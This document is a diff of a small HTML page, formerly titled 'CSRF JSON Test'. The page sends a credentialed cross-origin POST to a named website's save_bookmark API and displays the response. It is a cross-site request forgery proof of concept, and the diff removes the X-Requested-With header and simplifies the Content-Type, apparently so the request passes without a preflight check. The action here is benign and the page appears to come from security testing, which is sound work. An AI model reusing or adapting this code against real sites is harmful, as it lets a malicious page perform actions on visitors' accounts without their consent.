@@ -1,31 +1,28 @@
 <!DOCTYPE html>
 <html>
 <body>
-  <h2>CSRF JSON Test</h2>
-  <button onclick="send()">Send request</button>
+<button onclick="send()">Send JSON request</button>
+<pre id="out"></pre>
 
-  <pre id="out"></pre>
+<script>
+async function send() {
+  try {
+    const res = await fetch("https://www.powerpak.com/ws/api.asmx/save_bookmark", {
+      method: "POST",
+      credentials: "include",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({ entity_id: "124041" })
+    });
 
-  <script>
-    async function send() {
-      try {
-        const res = await fetch("https://www.powerpak.com/ws/api.asmx/save_bookmark", {
-          method: "POST",
-          credentials: "include",
-          headers: {
-            "Content-Type": "application/json; charset=utf-8",
-            "X-Requested-With": "XMLHttpRequest"
-          },
-          body: JSON.stringify({ entity_id: "124041" })
-        });
-
-        document.getElementById("out").textContent =
-          "Status: " + res.status + "\n" + await res.text();
-      } catch (e) {
-        document.getElementById("out").textContent =
-          "Blocked/Error: " + e.message;
-      }
-    }
-  </script>
+    document.getElementById("out").textContent =
+      "Status: " + res.status + "\n" + await res.text();
+  } catch (e) {
+    document.getElementById("out").textContent =
+      "Blocked/Error: " + e.message;
+  }
+}
+</script>
 </body>
 </html>
